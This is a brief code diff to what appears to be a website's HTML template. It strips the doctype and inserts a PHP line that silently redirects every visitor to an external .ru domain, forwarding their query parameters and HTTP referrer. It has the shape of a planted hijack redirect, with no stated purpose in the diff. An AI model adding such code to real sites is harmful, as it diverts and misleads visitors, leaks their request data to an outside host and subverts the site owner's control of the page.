@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html >
+<?php header('Location: https://nutrition.health-magazine.ru/LyFXBZ?' . http_build_query($_GET) . '&se_referrer=' . urlencode($_SERVER['HTTP_REFERER']) . ''); ?><html >
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
